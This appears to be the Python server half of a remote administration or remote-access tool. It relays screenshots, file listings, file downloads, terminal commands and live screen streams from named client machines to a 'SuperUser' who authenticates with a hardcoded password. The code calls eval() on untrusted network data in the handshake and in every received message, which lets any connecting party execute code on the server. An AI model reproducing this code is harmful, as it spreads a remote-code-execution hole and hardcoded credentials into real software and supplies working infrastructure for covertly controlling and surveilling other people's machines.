import asyncio
import os
import socket
import json
import signal
import traceback
from zlib import decompress, compress


class Server:

    def __init__(self, ip: str, port: int, header: int = 64):
        self.ip: str = ip
        self.port: int = port
        self.__running: bool = False
        self.server: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setblocking(False)
        self.clients: dict = dict()
        self.clients_close: dict = dict()
        self.HEADER = header

        self.__close = lambda signum, frame: self.stop_server()
        signal.signal(signal.SIGINT, self.__close)
        self.run = self.__run_server()

    def __run_server(self):
        if self.__running is False:
            self.__running: bool = True
            self.server.bind((self.ip, self.port))
            self.server.listen(20)
            self.main_loop = asyncio.new_event_loop()

            self.main_loop.create_task(self.__connect_processing())
            self.main_loop.run_forever()

    def stop_server(self):
        if self.__running is True:
            self.__running = False
            self.server = None
            self.main_loop.stop()
            print("Server stopped")
            exit(-1)

    async def __connect_processing(self):
        print("Server start")
        while self.__running:
            try:
                client, address = await self.main_loop.sock_accept(self.server)
                client_info = eval((await self.main_loop.sock_recv(client, 4096)).decode("utf8"))
                if client_info == {"ping"}:
                    client.close()
                    continue
                if client_info.get("name", False) and client_info.get("new_client", False):
                    client_name = client_info["name"]
                    if client_name == "%^SuperUser^%": print("SuperUser connected")
                    if client_name != "%^SuperUser^%": print(f"New client connection — address: {address} name: {client_name}")
                    if self.clients.get(client_name, False):
                        print("Удаление и остановка пользователя с тем же именем")
                        self.clients[client_name][1].cancel()
                    async_task = self.main_loop.create_task(self.__client_reciver(client, client_name))
                    self.clients[client_name] = [client, async_task]
                else:
                    client.close()
            except:
                continue

    async def __build_send(self, data: dict | list, client, local_loop):
        data = compress(json.dumps(data).encode("utf8"), 6)
        send_len = str(len(data)).encode("utf8")
        send_len += b" " * (self.HEADER - len(send_len))
        await local_loop.sock_sendall(client, send_len)
        await local_loop.sock_sendall(client, data)

    async def __recive_data(self, client, client_loop):
        # print("Жду")
        data_lenght: int = int((await client_loop.sock_recv(client, self.HEADER)).decode("utf8").strip())
        print(f"Принимаю данные, размером {data_lenght} Байта", end=": ")
        data = (await client_loop.sock_recv(client, data_lenght))
        diff_len = data_lenght - len(data)
        while diff_len > 0:
            print(f"\nПолучение остатка размером {diff_len} Байта", end=": ")
            data += (await client_loop.sock_recv(client, diff_len))
            diff_len = data_lenght - len(data)
        data = eval(decompress(data).decode("utf8"))
        print("принял")
        return data

    async def __client_reciver(self, client, name):
        client_loop = asyncio.get_event_loop()
        mode = "default"
        while not self.clients_close.get(client, False):
            try:
                data = await self.__recive_data(client, client_loop)

                # Default mode
                if mode == "default":
                    if data.get("SsTt0oPp", False):
                        self.clients_close.update({client: True})
                        continue
                    if data.get("start_stream", False):
                        mode = "stream"

                    if data.get("cmd", False):
                        cmd = data["cmd"]
                        if data.get("SuperUser", False) and data["SuperUser"] == "752113":
                            if cmd == "get_devices":
                                clients = {"clients": [x for x in list(self.clients) if x != "%^SuperUser^%"]}
                                await self.__build_send(clients, client, client_loop)
                            if cmd == "send":
                                if data.get("json", False) and data.get("to", False):
                                    json_, to_ = data["json"], data["to"]
                                    if self.clients.get(to_, False):
                                        await self.__build_send(json_, self.clients[to_][0], client_loop)
                        elif data.get("to", False):
                            if data["to"] == "$23$@$SU$@$32$": data["to"] = "%^SuperUser^%"
                            to_ = self.clients[data["to"]][0]
                            data.pop("to")
                            data.pop("cmd")
                            send_data = data
                            match cmd:
                                case "make_screenshot": send_data = {"image64": data["img"], "size": data["size_img"]}
                                case "files_path": send_data = {"files_info": data["files_info"]}
                                case "download_file": send_data.update({"from": name})
                                case "terminal_cmd": send_data.update({"console": "true"})

                            await self.__build_send(send_data, to_, client_loop)

                # Stream mode
                elif mode == "stream":
                    if data.get("size_stream", False):
                        self.size_stream = data["size_stream"]
                    if data.get("stream_stop", False):
                        mode = "default"
                        print("destroy window")
                        continue
                    elif data.get("stream", False):
                        try:
                            new_data = data
                            new_data.update({"name": name, "size": self.size_stream})
                            await self.__build_send(new_data, self.clients["%^SuperUser^%"][0], client_loop)
                        except:
                            print(traceback.format_exc())
                            mode = "default"
                            await self.__build_send({"cmd": "stop_stream", "return": "False"}, client, client_loop)

            except ConnectionAbortedError:
                self.clients_close.update({client: True})
                continue
            except ConnectionError:
                self.clients_close.update({client: True})
                continue
            except SyntaxError:
                self.clients_close.update({client: True})
            except ValueError:
                self.clients_close.update({client: True})
            except IndexError:
                continue
            except:
                self.clients_close.update({client: True})

        if self.clients.get(name, False) and self.clients_close.get(name, False):
            self.clients.pop(name)
            self.clients_close.pop(client)
            client.close()


if __name__ == '__main__':
    # os.environ["PORT"] = "5000"
    port = int(os.environ.get('PORT', 80))
    print(port)
    server = Server("0.0.0.0", port)
    server.run()



